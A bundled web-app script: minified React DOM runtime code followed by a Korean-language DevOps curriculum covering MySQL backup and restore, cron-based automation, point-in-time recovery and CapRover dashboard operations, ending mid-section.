Promise(function(o,c){i.onload=o,i.onerror=c}),je(s,"link",l),a.instance=s}e.stylesheets===null&&(e.stylesheets=new Map),e.stylesheets.set(a,t),(t=a.state.preload)&&(a.state.loading&3)===0&&(e.count++,a=ks.bind(e),t.addEventListener("load",a),t.addEventListener("error",a))}}var Po=0;function Hp(e,t){return e.stylesheets&&e.count===0&&qs(e,e.stylesheets),0<e.count||0<e.imgCount?function(a){var l=setTimeout(function(){if(e.stylesheets&&qs(e,e.stylesheets),e.unsuspend){var s=e.unsuspend;e.unsuspend=null,s()}},6e4+t);0<e.imgBytes&&Po===0&&(Po=62500*bp());var n=setTimeout(function(){if(e.waitingForImages=!1,e.count===0&&(e.stylesheets&&qs(e,e.stylesheets),e.unsuspend)){var s=e.unsuspend;e.unsuspend=null,s()}},(e.imgBytes>Po?50:800)+t);return e.unsuspend=a,function(){e.unsuspend=null,clearTimeout(l),clearTimeout(n)}}:null}function ks(){if(this.count--,this.count===0&&(this.imgCount===0||!this.waitingForImages)){if(this.stylesheets)qs(this,this.stylesheets);else if(this.unsuspend){var e=this.unsuspend;this.unsuspend=null,e()}}}var Ms=null;function qs(e,t){e.stylesheets=null,e.unsuspend!==null&&(e.count++,Ms=new Map,t.forEach(Gp,e),Ms=null,ks.call(e))}function Gp(e,t){if(!(t.state.loading&4)){var a=Ms.get(e);if(a)var l=a.get(null);else{a=new Map,Ms.set(e,a);for(var n=e.querySelectorAll("link[data-precedence],style[data-precedence]"),s=0;s<n.length;s++){var i=n[s];(i.nodeName==="LINK"||i.getAttribute("media")!=="not all")&&(a.set(i.dataset.precedence,i),l=i)}l&&a.set(null,l)}n=t.instance,i=n.getAttribute("data-precedence"),s=a.get(i)||l,s===l&&a.set(null,n),a.set(i,n),this.count++,l=ks.bind(this),n.addEventListener("load",l),n.addEventListener("error",l),s?s.parentNode.insertBefore(n,s.nextSibling):(e=e.nodeType===9?e.head:e,e.insertBefore(n,e.firstChild)),t.state.loading|=4}}var gn={$$typeof:ke,Provider:null,Consumer:null,_currentValue:Q,_currentValue2:Q,_threadCount:0};function Qp(e,t,a,l,n,s,i,o,c){this.tag=1,this.containerInfo=e,this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.next=this.pendingContext=this.context=this.cancelPendingCommit=null,this.callbackPriority=0,this.expirationTimes=Xs(-1),this.entangledLanes=this.shellSuspendCounter=this.errorRecoveryDisabledLanes=this.expiredLanes=this.warmLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=Xs(0),this.hiddenUpdates=Xs(null),this.identifierPrefix=l,this.onUncaughtError=n,this.onCaughtError=s,this.onRecoverableError=i,this.pooledCache=null,this.pooledCacheLanes=0,this.formState=c,this.incompleteTransitions=new Map}function ef(e,t,a,l,n,s,i,o,c,g,E,R){return e=new Qp(e,t,a,i,c,g,E,R,o),t=1,s===!0&&(t|=24),s=st(3,null,null,t),e.current=s,s.stateNode=e,t=ki(),t.refCount++,e.pooledCache=t,t.refCount++,s.memoizedState={element:l,isDehydrated:a,cache:t},Li(s),e}function tf(e){return e?(e=tl,e):tl}function af(e,t,a,l,n,s){n=tf(n),l.context===null?l.context=n:l.pendingContext=n,l=ia(t),l.payload={element:a},s=s===void 0?null:s,s!==null&&(l.callback=s),a=oa(e,l,t),a!==null&&(Pe(a,e,t),Il(a,e,t))}function lf(e,t){if(e=e.memoizedState,e!==null&&e.dehydrated!==null){var a=e.retryLane;e.retryLane=a!==0&&a<t?a:t}}function Fo(e,t){lf(e,t),(e=e.alternate)&&lf(e,t)}function nf(e){if(e.tag===13||e.tag===31){var t=Da(e,67108864);t!==null&&Pe(t,e,67108864),Fo(e,67108864)}}function sf(e){if(e.tag===13||e.tag===31){var t=rt();t=Is(t);var a=Da(e,t);a!==null&&Pe(a,e,t),Fo(e,t)}}var Ns=!0;function Yp(e,t,a,l){var n=_.T;_.T=null;var s=O.p;try{O.p=2,ec(e,t,a,l)}finally{O.p=s,_.T=n}}function Kp(e,t,a,l){var n=_.T;_.T=null;var s=O.p;try{O.p=8,ec(e,t,a,l)}finally{O.p=s,_.T=n}}function ec(e,t,a,l){if(Ns){var n=tc(l);if(n===null)Ho(e,t,l,Ls,a),cf(e,l);else if(Xp(n,e,t,a,l))l.stopPropagation();else if(cf(e,l),t&4&&-1<Vp.indexOf(e)){for(;n!==null;){var s=Ka(n);if(s!==null)switch(s.tag){case 3:if(s=s.stateNode,s.current.memoizedState.isDehydrated){var i=Ra(s.pendingLanes);if(i!==0){var o=s;for(o.pendingLanes|=2,o.entangledLanes|=2;i;){var c=1<<31-lt(i);o.entanglements[1]|=c,i&=~c}Mt(s),(se&6)===0&&(gs=tt()+500,rn(0))}}break;case 31:case 13:o=Da(s,2),o!==null&&Pe(o,s,2),vs(),Fo(s,2)}if(s=tc(l),s===null&&Ho(e,t,l,Ls,a),s===n)break;n=s}n!==null&&l.stopPropagation()}else Ho(e,t,l,null,a)}}function tc(e){return e=ai(e),ac(e)}var Ls=null;function ac(e){if(Ls=null,e=Ya(e),e!==null){var t=Y(e);if(t===null)e=null;else{var a=t.tag;if(a===13){if(e=Z(t),e!==null)return e;e=null}else if(a===31){if(e=fe(t),e!==null)return e;e=null}else if(a===3){if(t.stateNode.current.memoizedState.isDehydrated)return t.tag===3?t.stateNode.containerInfo:null;e=null}else t!==e&&(e=null)}}return Ls=e,null}function of(e){switch(e){case"beforetoggle":case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"toggle":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 2;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 8;case"message":switch(kf()){case pc:return 2;case hc:return 8;case Tn:case Mf:return 32;case gc:return 268435456;default:return 32}default:return 32}}var lc=!1,va=null,Sa=null,ba=null,yn=new Map,vn=new Map,Ea=[],Vp="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset".split(" ");function cf(e,t){switch(e){case"focusin":case"focusout":va=null;break;case"dragenter":case"dragleave":Sa=null;break;case"mouseover":case"mouseout":ba=null;break;case"pointerover":case"pointerout":yn.delete(t.pointerId);break;case"gotpointercapture":case"lostpointercapture":vn.delete(t.pointerId)}}function Sn(e,t,a,l,n,s){return e===null||e.nativeEvent!==s?(e={blockedOn:t,domEventName:a,eventSystemFlags:l,nativeEvent:s,targetContainers:[n]},t!==null&&(t=Ka(t),t!==null&&nf(t)),e):(e.eventSystemFlags|=l,t=e.targetContainers,n!==null&&t.indexOf(n)===-1&&t.push(n),e)}function Xp(e,t,a,l,n){switch(t){case"focusin":return va=Sn(va,e,t,a,l,n),!0;case"dragenter":return Sa=Sn(Sa,e,t,a,l,n),!0;case"mouseover":return ba=Sn(ba,e,t,a,l,n),!0;case"pointerover":var s=n.pointerId;return yn.set(s,Sn(yn.get(s)||null,e,t,a,l,n)),!0;case"gotpointercapture":return s=n.pointerId,vn.set(s,Sn(vn.get(s)||null,e,t,a,l,n)),!0}return!1}function uf(e){var t=Ya(e.target);if(t!==null){var a=Y(t);if(a!==null){if(t=a.tag,t===13){if(t=Z(a),t!==null){e.blockedOn=t,_c(e.priority,function(){sf(a)});return}}else if(t===31){if(t=fe(a),t!==null){e.blockedOn=t,_c(e.priority,function(){sf(a)});return}}else if(t===3&&a.stateNode.current.memoizedState.isDehydrated){e.blockedOn=a.tag===3?a.stateNode.containerInfo:null;return}}}e.blockedOn=null}function ws(e){if(e.blockedOn!==null)return!1;for(var t=e.targetContainers;0<t.length;){var a=tc(e.nativeEvent);if(a===null){a=e.nativeEvent;var l=new a.constructor(a.type,a);ti=l,a.target.dispatchEvent(l),ti=null}else return t=Ka(a),t!==null&&nf(t),e.blockedOn=a,!1;t.shift()}return!0}function rf(e,t,a){ws(e)&&a.delete(t)}function Ip(){lc=!1,va!==null&&ws(va)&&(va=null),Sa!==null&&ws(Sa)&&(Sa=null),ba!==null&&ws(ba)&&(ba=null),yn.forEach(rf),vn.forEach(rf)}function Us(e,t){e.blockedOn===t&&(e.blockedOn=null,lc||(lc=!0,S.unstable_scheduleCallback(S.unstable_NormalPriority,Ip)))}var zs=null;function df(e){zs!==e&&(zs=e,S.unstable_scheduleCallback(S.unstable_NormalPriority,function(){zs===e&&(zs=null);for(var t=0;t<e.length;t+=3){var a=e[t],l=e[t+1],n=e[t+2];if(typeof l!="function"){if(ac(l||a)===null)continue;break}var s=Ka(a);s!==null&&(e.splice(t,3),t-=3,eo(s,{pending:!0,data:n,method:a.method,action:l},l,n))}}))}function Al(e){function t(c){return Us(c,e)}va!==null&&Us(va,e),Sa!==null&&Us(Sa,e),ba!==null&&Us(ba,e),yn.forEach(t),vn.forEach(t);for(var a=0;a<Ea.length;a++){var l=Ea[a];l.blockedOn===e&&(l.blockedOn=null)}for(;0<Ea.length&&(a=Ea[0],a.blockedOn===null);)uf(a),a.blockedOn===null&&Ea.shift();if(a=(e.ownerDocument||e).$$reactFormReplay,a!=null)for(l=0;l<a.length;l+=3){var n=a[l],s=a[l+1],i=n[Xe]||null;if(typeof s=="function")i||df(a);else if(i){var o=null;if(s&&s.hasAttribute("formAction")){if(n=s,i=s[Xe]||null)o=i.formAction;else if(ac(n)!==null)continue}else o=i.action;typeof o=="function"?a[l+1]=o:(a.splice(l,3),l-=3),df(a)}}}function ff(){function e(s){s.canIntercept&&s.info==="react-transition"&&s.intercept({handler:function(){return new Promise(function(i){return n=i})},focusReset:"manual",scroll:"manual"})}function t(){n!==null&&(n(),n=null),l||setTimeout(a,20)}function a(){if(!l&&!navigation.transition){var s=navigation.currentEntry;s&&s.url!=null&&navigation.navigate(s.url,{state:s.getState(),info:"react-transition",history:"replace"})}}if(typeof navigation=="object"){var l=!1,n=null;return navigation.addEventListener("navigate",e),navigation.addEventListener("navigatesuccess",t),navigation.addEventListener("navigateerror",t),setTimeout(a,100),function(){l=!0,navigation.removeEventListener("navigate",e),navigation.removeEventListener("navigatesuccess",t),navigation.removeEventListener("navigateerror",t),n!==null&&(n(),n=null)}}}function nc(e){this._internalRoot=e}js.prototype.render=nc.prototype.render=function(e){var t=this._internalRoot;if(t===null)throw Error(m(409));var a=t.current,l=rt();af(a,l,e,t,null,null)},js.prototype.unmount=nc.prototype.unmount=function(){var e=this._internalRoot;if(e!==null){this._internalRoot=null;var t=e.containerInfo;af(e.current,2,null,e,null,null),vs(),t[Qa]=null}};function js(e){this._internalRoot=e}js.prototype.unstable_scheduleHydration=function(e){if(e){var t=Ec();e={blockedOn:null,target:e,priority:t};for(var a=0;a<Ea.length&&t!==0&&t<Ea[a].priority;a++);Ea.splice(a,0,e),a===0&&uf(e)}};var mf=U.version;if(mf!=="19.2.0")throw Error(m(527,mf,"19.2.0"));O.findDOMNode=function(e){var t=e._reactInternals;if(t===void 0)throw typeof e.render=="function"?Error(m(188)):(e=Object.keys(e).join(","),Error(m(268,e)));return e=b(t),e=e!==null?M(e):null,e=e===null?null:e.stateNode,e};var Zp={bundleType:0,version:"19.2.0",rendererPackageName:"react-dom",currentDispatcherRef:_,reconcilerVersion:"19.2.0"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var Bs=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!Bs.isDisabled&&Bs.supportsFiber)try{Cl=Bs.inject(Zp),at=Bs}catch{}}return En.createRoot=function(e,t){if(!L(e))throw Error(m(299));var a=!1,l="",n=Sr,s=br,i=Er;return t!=null&&(t.unstable_strictMode===!0&&(a=!0),t.identifierPrefix!==void 0&&(l=t.identifierPrefix),t.onUncaughtError!==void 0&&(n=t.onUncaughtError),t.onCaughtError!==void 0&&(s=t.onCaughtError),t.onRecoverableError!==void 0&&(i=t.onRecoverableError)),t=ef(e,1,!1,null,null,a,l,null,n,s,i,ff),e[Qa]=t.current,Bo(e),new nc(t)},En.hydrateRoot=function(e,t,a){if(!L(e))throw Error(m(299));var l=!1,n="",s=Sr,i=br,o=Er,c=null;return a!=null&&(a.unstable_strictMode===!0&&(l=!0),a.identifierPrefix!==void 0&&(n=a.identifierPrefix),a.onUncaughtError!==void 0&&(s=a.onUncaughtError),a.onCaughtError!==void 0&&(i=a.onCaughtError),a.onRecoverableError!==void 0&&(o=a.onRecoverableError),a.formState!==void 0&&(c=a.formState)),t=ef(e,1,!0,t,a??null,l,n,c,s,i,o,ff),t.context=tf(null),a=t.current,l=rt(),l=Is(l),n=ia(l),n.callback=null,oa(a,n,l),a=l,t.current.lanes=a,Dl(t,a),Mt(t),e[Qa]=t.current,Bo(e),new js(t)},En.version="19.2.0",En}var Tf;function n0(){if(Tf)return oc.exports;Tf=1;function S(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(S)}catch(U){console.error(U)}}return S(),oc.exports=l0(),oc.exports}var s0=n0();const i0={beginner:{title:"초급: 백업이 왜 필요한지 이해하고 수동 백업하기",sections:[{heading:"📚 학습 목표",content:"데이터베이스 백업의 개념과 필요성을 이해하고, mysqldump를 사용하여 수동 백업을 실행할 수 있다."},{heading:"1. 백업이란 무엇인가?",content:"백업은 데이터베이스의 현재 상태를 파일로 저장하는 작업입니다. 서버 장애, 실수로 인한 삭제, 해킹 등의 상황에서 데이터를 복구하기 위한 필수 작업입니다.",list:["사용자가 실수로 DELETE FROM users; 실행 → 모든 회원 데이터 삭제","서버 디스크 고장 → 모든 데이터 영구 손실","랜섬웨어 공격 → 데이터 암호화되어 접근 불가"]},{heading:"2. mysqldump 기본 사용법",code:`# CapRover에서 MySQL 컨테이너에 접속
docker exec -it $(docker ps | grep mysql | awk '{print $1}') bash

# 전체 데이터베이스 백업
mysqldump -u root -p'비밀번호' --all-databases > /backup/full_backup_$(date +%Y%m%d).sql

# 특정 데이터베이스만 백업
mysqldump -u root -p'비밀번호' cms_database > /backup/cms_backup.sql

# 백업 파일을 호스트로 복사
docker cp mysql_container:/backup/cms_backup.sql ./backups/`},{heading:"3. 백업 파일 확인하기",content:"백업 파일은 SQL 문으로 이루어진 텍스트 파일입니다:",code:`head -20 cms_backup.sql
# 출력 예시:
# -- MySQL dump 10.13
# CREATE TABLE users (
#   id int PRIMARY KEY,
#   username varchar(50),
#   ...
# );
# INSERT INTO users VALUES (1, 'admin', ...);`},{heading:"4. 실습: 첫 백업 실행하기",steps:[{label:"Step 1",text:"CapRover 대시보드 → Apps → MySQL → 터미널 접속"},{label:"Step 2",text:"백업 디렉토리 생성",code:"mkdir -p /backup"},{label:"Step 3",text:"백업 실행",code:"mysqldump -u root -p$MYSQL_ROOT_PASSWORD cms_database > /backup/my_first_backup.sql"},{label:"Step 4",text:"백업 확인",code:`ls -lh /backup/
# 출력: -rw-r--r-- 1 mysql mysql 15M Jan 15 10:30 my_first_backup.sql`,note:"파일 크기가 0보다 크면 성공!"}]},{heading:"5. 백업 파일 보관하기",content:"백업 파일은 데이터베이스 서버와 다른 장소에 보관해야 합니다:",list:["로컬 컴퓨터에 다운로드","클라우드 스토리지 (Google Drive, AWS S3)","외부 서버"],code:`# CapRover 호스트에서 실행
docker cp $(docker ps | grep mysql | awk '{print $1}'):/backup/my_first_backup.sql ~/safe_location/`},{heading:"⚠️ 주의사항",list:["백업 파일에는 비밀번호 등 민감정보가 포함되어 있습니다","백업 파일 권한을 600으로 제한: chmod 600 backup.sql","정기적으로 백업 파일이 복구 가능한지 테스트하세요"]},{heading:"✅ 체크리스트",checklist:["mysqldump 명령어로 백업 실행 성공","백업 파일 크기 확인 (0보다 커야 함)","백업 파일을 안전한 장소에 복사","백업 파일을 텍스트 에디터로 열어 내용 확인"],nextStep:"이 백업을 실제로 복구하는 방법을 배우고, 백업을 자동화하는 방법을 익힙니다."}]},intermediate:{title:"중급: 백업 자동화하고 복구 시나리오 대비하기",sections:[{heading:"📚 학습 목표",content:"Cron을 사용하여 백업을 자동화하고, 다양한 복구 시나리오에 대비할 수 있다."},{heading:"1. 백업 자동화가 필요한 이유",content:"수동 백업의 문제점:",list:["깜빡하고 잊어버림 → 장애 발생 시 복구 불가","백업 주기가 불규칙 → 최신 데이터 손실 위험","사람이 직접 해야 함 → 시간 낭비"]},{heading:"2. 백업 스크립트 작성",code:`#!/bin/bash
# /backup/mysql_backup.sh

DATE=$(date +%Y%m%d_%H%M%S)
BACKUP_DIR="/backup"
DB_NAME="cms_database"
KEEP_DAYS=7

# 백업 실행
mysqldump -u root -p$MYSQL_ROOT_PASSWORD   --single-transaction   --routines   --triggers   $DB_NAME > $BACKUP_DIR/backup_$DATE.sql

# 압축하여 공간 절약
gzip $BACKUP_DIR/backup_$DATE.sql

# 7일 이상 된 백업 삭제
find $BACKUP_DIR -name "backup_*.sql.gz" -mtime +$KEEP_DAYS -delete

echo "Backup completed: backup_$DATE.sql.gz"`},{heading:"3. Cron 설정하기",steps:[{label:"Step 1",text:"스크립트 실행 권한 부여",code:"chmod +x /backup/mysql_backup.sh"},{label:"Step 2",text:"Cron 편집기 열기",code:"crontab -e"},{label:"Step 3",text:"매일 새벽 2시에 백업 실행",code:"0 2 * * * /backup/mysql_backup.sh >> /var/log/backup.log 2>&1"},{label:"Step 4",text:"Cron 작업 확인",code:"crontab -l"}]},{heading:"4. 복구 테스트",content:"백업은 복구할 수 있어야 의미가 있습니다. 반드시 테스트하세요!",steps:[{label:"테스트 DB 생성",code:"mysql -u root -p -e 'CREATE DATABASE test_restore;'"},{label:"백업 파일 복구",code:"gunzip < backup_20250104_020001.sql.gz | mysql -u root -p test_restore"},{label:"데이터 확인",code:"mysql -u root -p test_restore -e 'SHOW TABLES;'"},{label:"테스트 DB 삭제",code:"mysql -u root -p -e 'DROP DATABASE test_restore;'"}]},{heading:"✅ 자동화 체크리스트",checklist:["백업 스크립트가 정상 실행되는가?","Cron이 설정된 시간에 작동하는가?","오래된 백업이 자동 삭제되는가?","복구 테스트가 성공했는가?"]}]},advanced:{title:"고급: 증분 백업과 Point-in-Time 복구",sections:[{heading:"📚 학습 목표",content:"Binary Log를 활용한 증분 백업과 특정 시점으로 복구하는 방법을 익힙니다."},{heading:"1. Binary Log란?",content:"MySQL의 모든 데이터 변경 사항(INSERT, UPDATE, DELETE)을 기록하는 로그입니다. 이를 활용하면:",list:["전체 백업 + Binary Log = 어떤 시점으로든 복구 가능","디스크 공간 절약 (전체 백업은 하루 1회, 증분은 계속)","사용자가 실수한 직전 시점으로 복구"]},{heading:"2. Binary Log 활성화",content:"CapRover MySQL 컨테이너의 my.cnf 설정:",code:`[mysqld]
server-id = 1
log_bin = /var/log/mysql/mysql-bin.log
expire_logs_days = 7
max_binlog_size = 100M

# 컨테이너 재시작 필요
docker restart $(docker ps | grep mysql | awk '{print $1}')`},{heading:"3. Point-in-Time 복구 시나리오",content:"예시: 오후 3시에 실수로 DELETE 쿼리 실행, 마지막 전체 백업은 새벽 2시",steps:[{label:"Step 1",text:"새벽 2시 전체 백업 복구",code:"mysql -u root -p cms_database < backup_20250104_020000.sql"},{label:"Step 2",text:"Binary Log에서 2시~3시 사이의 변경사항 추출",code:`mysqlbinlog --start-datetime='2025-01-04 02:00:00' \\
  --stop-datetime='2025-01-04 14:59:59' \\
  /var/log/mysql/mysql-bin.000001 > incremental.sql`},{label:"Step 3",text:"증분 복구 적용",code:"mysql -u root -p cms_database < incremental.sql"},{label:"결과",text:"오후 3시 직전 상태로 완벽 복구!"}]},{heading:"4. 실전 복구 플레이북",content:"긴급 상황 대응 절차:",checklist:["즉시 서비스 중지 (추가 손상 방지)","현재 데이터베이스 전체 덤프 (현재 상태 보존)","가장 최근 전체 백업 확인","Binary Log 위치 확인","테스트 환경에서 복구 시뮬레이션","성공 확인 후 프로덕션 복구","서비스 재개 및 데이터 검증"]},{heading:"5. 고급 백업 전략",list:["3-2-1 규칙: 3개 복사본, 2개 다른 미디어, 1개 오프사이트","핫 백업(실시간) vs 콜드 백업(서비스 중지)","레플리카 서버 활용 (읽기 부하 분산 + 백업 소스)","클라우드 백업 자동화 (AWS S3, Google Cloud Storage)"]},{heading:"⚡ 고급 실습 과제",checklist:["Binary Log를 활성화하고 5분 후 특정 레코드 삭제 후 복구","백업 파일을 S3에 자동 업로드하는 스크립트 작성","복구 시간 목표(RTO) 1시간 이내 달성 가능한지 테스트","재해 복구 문서(Disaster Recovery Plan) 작성"]}]}},Rf={tiers:[{id:"tier1",name:"Tier 1: 긴급 생존 기술",period:"1~2주, 필수",color:"bg-red-100 border-red-300 text-red-800",reason:"서비스가 다운되거나 데이터가 날아갔을 때 복구하기 위해",topics:[{id:"1-1",name:"백업 & 복구 시스템",goal:"데이터를 안전하게 보관하고 문제 시 복구할 수 있다",hours:5,keywords:["mysqldump","mysql import","cron","backup strategy"],tasks:["MySQL 수동 백업 3회 실행","백업 파일로 테스트 DB 복구","자동 백업 스크립트 작성 및 테스트"],content:i0},{id:"1-2",name:"CapRover 대시보드 마스터",goal:"CapRover를 통해 시스템 상태를 파악하고 기본 조치를 할 수 있다",hours:3,keywords:["CapRover","Docker container","application monitoring"],tasks:["각 앱의 로그 10분씩 관찰","의도적으로 앱 중지 후 재시작","환경변수 하나 변경하고 재배포"],content:{beginner:{title:"초급: CapRover 인터페이스 익히기",sections:[{heading:"📚 학습 목표",content:"CapRover 대시보드의 주요 메뉴를 이해하고, 앱의 상태를 파악할 수 있다."},{heading:"1. CapRover란?",content:"CapRover는 Docker 기반의 오픈소스 PaaS(Platform as a Service)입니다. Heroku처럼 쉽게 앱을 배포하지만, 자신의 서버에서 완전한 제어권을 갖습니다.",list:["무료 오픈소스 (Heroku는 유료)","Git push만으로 자동 배포","무중단 배포, SSL 인증서 자동 발급","하나의 서버에서 여러 앱 관리"]},{heading:"2. 대시보드 주요 메뉴 둘러보기",steps:[{label:"Apps",text:"배포된 앱 목록 (MySQL, Redis, PHP 백엔드, React 프론트엔드 등)"},{label:"Monitoring",text:"NetData 연동 - CPU, 메모리, 디스크, 네트워크 실시간 그래프"},{label:"Cluster",text:"서버(노드) 관리 - 여러 서버를 클러스터로 묶을 수 있음"},{label:"Settings",text:"시스템 설정 - 도메인, SSL, 비밀번호 변경 등"}]},{heading:"3. 앱 상태 확인하기",content:"Apps 메뉴에서 각 앱의 상태를 확인할 수 있습니다:",list:["초록불: 정상 실행 중 (Running)","회색: 중지됨 (Stopped)","빨강: 에러 발생 (Error/Crashed)"],code:`# 앱을 클릭하면 볼 수 있는 정보:
- Instance Count: 실행 중인 컨테이너 수
- Memory Limit: 메모리 제한 (기본 512MB)
- Port Mapping: 포트 설정
- Environment Variables: 환경 변수 (DB 비밀번호 등)
- Logs: 최근 로그 100줄`},{heading:"4. 실습: 앱 로그 10분간 관찰하기",steps:[{label:"Step 1",text:"Apps → MySQL 앱 클릭"},{label:"Step 2",text:"App Logs 탭으로 이동"},{label:"Step 3",text:"Auto Refresh 활성화 (우측 상단 토글)"},{label:"관찰 포인트",text:"어떤 쿼리가 실행되는가? 에러 메시지는 없는가?"}]},{heading:"5. HTTP Settings 이해하기",content:"각 앱의 HTTP Settings에서 도메인과 SSL을 설정합니다:",code:`# 예시:
- Enable HTTPS: 체크 (Let's Encrypt 자동 SSL)
- Container HTTP Port: 80 (앱이 리스닝하는 포트)
- Force HTTPS: 체크 (HTTP → HTTPS 리다이렉트)
- Custom Domain: cms.example.com`},{heading:"✅ 초급 체크리스트",checklist:["각 앱의 상태(초록/회색/빨강) 확인","MySQL, Redis, 백엔드, 프론트엔드 로그를 각각 10분씩 관찰","앱 하나의 Environment Variables 확인","Monitoring 메뉴에서 CPU/메모리 그래프 확인"]}]},intermediate:{title:"중급: 컨테이너 라이프사이클과 문제 해결",sections:[{heading:"📚 학습 목표",content:"컨테이너를 중지/재시작하고, 환경변수를 변경하여 앱 동작을 제어할 수 있다."},{heading:"1. 컨테이너 라이프사이클",content:"컨테이너는 생명주기를 가진 프로세스입니다:",list:["Created: 이미지로부터 생성됨","Running: 실행 중 (앱이 작동하는 상태)","Stopped: 중지됨 (데이터는 보존)","Restarting: 재시작 중","Dead: 비정상 종료"]},{heading:"2. 실습: 의도적으로 앱 중지 후 재시작",steps:[{label:"Step 1",text:"테스트용 앱 선택 (프론트엔드 추천)",code:"Apps → React 앱 클릭"},{label:"Step 2",text:"앱 중지하기",code:"우측 상단 ... 메뉴 → Stop"},{label:"Step 3",text:"브라우저에서 사이트 접속 → 502 Bad Gateway 확인"},{label:"Step 4",text:"앱 재시작",code:"... 메뉴 → Start"},{label:"Step 5",text:"30초 대기 후 사이트 정상 작동 확인"}]},{heading:"3. 환경변수 변경하기",content:"환경변수는 앱의 설정값입니다 (DB 주소, API 키 등). 변경 시 재배포가 필요합니다.",steps:[{label:"예시",text:"백엔드 앱의 디버그 모드 활성화",code:`# App Config 탭 → Environment Variables
KEY: DEBUG
VALUE: true

# Save & Update 클릭 → 자동 재배포 시작`}]},{heading:"4. 로그로 문제 진단하기",content:"앱이 제대로 시작하지 않을 때:",list:["App Logs에서 에러 메시지 확인","환경변수 오타 확인 (DB_HOST vs DATABASE_HOST)","포트 충돌 확인 (같은 포트를 2개 앱이 사용)","메모리 부족 (앱이 반복적으로 재시작)"],code:`# 흔한 에러 예시
Error: connect ECONNREFUSED 127.0.0.1:3306
→ MySQL이 중지되었거나 연결 정보가 틀림

FATAL: could not allocate memory
→ 메모리 제한 초과, App Config에서 메모리 증가 필요`},{heading:"5. 재배포(Redeploy) 이해하기",content:"다음 경우에 재배포가 필요합니다:",list:["환경변수 변경","코드 업데이트 (Git push)","컨테이너 설정 변경 (메모리, 포트 등)"],code:`# 재배포 과정:
1. 새 컨테이너 생성 (새로운 설정 적용)
2. 헬스체크 통과 확인
3. 기존 컨테이너 트래픽 차단
4. 새 컨테이너로 트래픽 전환
5. 기존 컨테이너 종료

→ 무중단 배포(Zero Downtime Deployment)`},{heading:"✅ 중급 체크리스트",checklist:["앱 중지 → 재시작 성공","환경변수 하나 변경 후 재배포 성공","로그에서 에러 메시지 찾아 해석","재배포 과정에서 사이트 접속 테스트 (무중단 확인)"]}]},advanced:{title:"고급: 무중단 배포와 스케일링",sections:[{heading:"📚 학습 목표",content:"앱을 스케일 아웃하여 트래픽을 분산하고, 무중단 배포를 완벽히 이해한다."},{heading:"1. 스케일링이란?",content:"트래픽이 증가하면 서버를 확장해야 합니다:",list:["Scale Up (수직 확장): 서버의 CPU/메모리 증가","Scale Out (수평 확장): 같은 앱의 컨테이너를 여러 개 실행"],code:`# CapRover는 Scale Out을 쉽게 지원
App Config → Instance Count: 3
→ 같은 앱이 3개 컨테이너로 실행
→ 트래픽은 자동으로 로드밸런싱`},{heading:"2. 실습: 앱 스케일 아웃",steps:[{label:"Step 1",text:"백엔드 앱의 Instance Count를 3으로 변경"},{label:"Step 2",text:"Save & Update → 3개 컨테이너 생성 확인"},{label:"Step 3",text:"Monitoring에서 메모리 사용량 증가 확인"},{label:"Step 4",text:"로그에서 3개 컨테이너의 다른 로그 확인",note:"요청이 각 컨테이너에 분산됨"}]},{heading:"3. 로드밸런싱 전략",content:"CapRover는 Nginx로 로드밸런싱을 수행합니다:",list:["Round Robin: 순서대로 요청 분배 (기본값)","Least Connections: 연결이 적은 컨테이너 우선","IP Hash: 같은 IP는 같은 컨테이너로 (세션 유지)"],code:`# 고급 설정 (Nginx Config Override)
upstream backend {
  least_conn;
  server container1:3000;
  server container2:3000;
  server container3:3000;
}`},{heading:"4. 헬스체크와 자동 복구",content:"CapRover는 컨테이너 상태를 주기적으로 확인합니다:",code:`# App Config → Health Check Path
/health

# 백엔드에서 헬스체크 엔드포인트 구현
GET /health
Response: { "status": "ok", "timestamp": 1234567890 }

# 헬스체크 실패 시:
1. 해당 컨테이너로 트래픽 차단
2. 3번 재시도
3. 여전히 실패하면 컨테이너 재시작`},{heading:"5. 무중단 배포 심화",content:"배포 시 다운타임을 0으로 만드는 전략:",steps:[{label:"Blue-Green 배포",text:"기존(Blue)과 새(Green) 환경을 동시 운영 → 전환",note:"CapRover는 자동으로 Blue-Green 배포 수행"},{label:"Rolling 배포",text:"인스턴스를 하나씩 순차적으로 업데이트",code:`Instance Count: 3
1번 업데이트 → 2, 3번으로 트래픽
2번 업데이트 → 1, 3번으로 트래픽
3번 업데이트 → 1, 2번으로 트래픽`}]},{heading:"6. 리소스 제한과 모니터링",content:"컨테이너가 과도한 리소스를 사용하지 않도록 제한:",code:`# App Config → Advanced Settings
Memory Limit: 512MB (기본값)
CPU Shares: 1024 (상대적 비율)

# 메모리 초과 시:
- OOMKilled (Out Of Memory Killed)
- 컨테이너 강제 종료 → 자동 재시작
